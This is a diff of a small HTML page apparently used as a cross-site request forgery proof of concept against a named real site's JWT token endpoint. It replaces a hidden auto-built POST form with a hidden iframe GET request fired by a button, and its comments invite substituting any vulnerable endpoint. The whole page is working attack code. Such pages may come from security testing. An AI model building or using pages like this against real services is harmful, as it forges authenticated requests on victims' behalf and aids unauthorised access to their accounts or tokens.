@@ -1,30 +1,24 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>CSRF PoC</title>
+  <title>CSRF PoC - Manual GET</title>
 </head>
 <body>
-  <h2>CSRF Proof of Concept</h2>
-  <button onclick="exploit()">Click to Exploit</button>
+  <h2>CSRF Proof of Concept (Manual Trigger)</h2>
+
+  <!-- Manual button -->
+  <button onclick="triggerCSRF()">Click to Trigger CSRF</button>
 
   <script>
-    function exploit() {
-      var f = document.createElement("form");
-      f.method = "POST"; // or GET, depending on your case
-      f.action = "https://www.datacamp.com/api/jwt/token"; // replace with the vulnerable endpoint
+    function triggerCSRF() {
+      // Create a hidden iframe to send the GET request when button is clicked
+      var iframe = document.createElement("iframe");
+      iframe.style.display = "none";
+      iframe.src = "https://www.datacamp.com/api/jwt/token"; // Replace with your vulnerable GET endpoint
+      document.body.appendChild(iframe);
 
-      // Example payload (modify depending on action you tested)
-      var input = document.createElement("input");
-      input.type = "hidden";
-      input.name = "id";
-      input.value = "123"; 
-      f.appendChild(input);
-
-      document.body.appendChild(f);
-      f.submit();
-
-      alert("CSRF Exploit Triggered!");
+      alert("CSRF GET Triggered!");
     }
   </script>
 </body>
